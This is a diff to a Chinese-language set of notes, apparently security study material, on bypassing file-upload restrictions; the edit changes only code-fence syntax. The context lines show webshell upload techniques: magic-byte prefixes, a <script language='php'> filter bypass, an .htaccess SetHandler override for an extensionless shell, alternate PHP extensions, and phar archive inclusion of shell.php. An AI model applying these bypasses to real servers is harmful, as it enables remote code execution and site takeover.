@@ -20,7 +20,7 @@ GIF: 47 49 46 38 39 61(GIF89a)<br>
 PNG: 89 50 4E 47<br>
 绕过方法：在文件幻数后面加上自己的一句话木马<br>
 过滤了<?php，可使用以下脚本绕过：<br>
-``` {.php}
+```php
 <script language='php或者PHP或者PhP...'>
     phpinfo();
 </script>
@@ -39,7 +39,7 @@ php、php2、hph3、php4、php5、pht、phtml、asp、ascx、jsp、bat、exe、d
 + ****.htaccess文件攻击（Apache）****<br>
  .htaccess文件：Apache服务器中的一个配置文件，负责相关的网络配置<br>
 建一个.htaccess 文件，里面的内容如下，然后上传覆盖原始.htaccess文件
-``` {.xml}
+```xml
 <!-- 上传一个文件名字叫做pino的文件，不要后缀名，然后里面是一句话木马，用菜刀连接 -->
 <FilesMatch "pino">
     SetHandler application/x-httpd-php
@@ -83,7 +83,7 @@ filename[0] = png<br>
 
   生成phar文件的示例代码：（注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件）
 
-```{.php}
+```php
   <?php
   class PharDemo{
       private $message;
@@ -104,7 +104,7 @@ filename[0] = png<br>
   $phar->stopBuffering();
 ```
 
-```{.php}
+```php
   callphar.php
   <?php
       include 'phar://my.phar/shell.php';
